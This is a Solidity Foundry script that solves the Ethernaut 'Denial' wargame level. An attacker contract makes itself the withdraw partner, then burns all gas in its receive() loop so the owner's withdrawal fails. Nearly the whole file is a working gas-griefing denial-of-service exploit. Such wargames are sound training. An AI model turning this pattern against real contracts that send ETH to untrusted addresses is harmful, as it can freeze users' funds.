//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "lib/forge-std/src/Script.sol";
import {Denial}  from "src/ethernaut20.sol";
import {console} from "lib/forge-std/src/console.sol";

contract ethernaut20Script is Script{
 Denial instance = Denial(payable(0x02b34C53B1950aa67387D7739A19BbD5989b9002));   
 function run() public{
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        attacker attacke = new attacker();

        attacke.attack();

        console.log("patner address : ", instance.partner());
        console.log("attacker address : ", address(attacke));
        console.log("owner address : ", address(instance));


        vm.stopBroadcast();
    }
}

contract attacker{
    Denial instance = Denial(payable(0x02b34C53B1950aa67387D7739A19BbD5989b9002));  
    uint256[] public gasconsumer ; 

    constructor() payable{}

    function attack() public{
        instance.setWithdrawPartner(address(this));
        instance.withdraw();
    }

    receive() external payable {
            
            while(gasleft() > 0){
                
                gasconsumer.push(gasleft());

                console.log("gas : ", gasleft());
                console.log("balance : ", address(this).balance);
                console.log("address : ", address(this));
                console.log("msg.sender : ", msg.sender);

                console.log("owner set ");
            }
    }
    
}


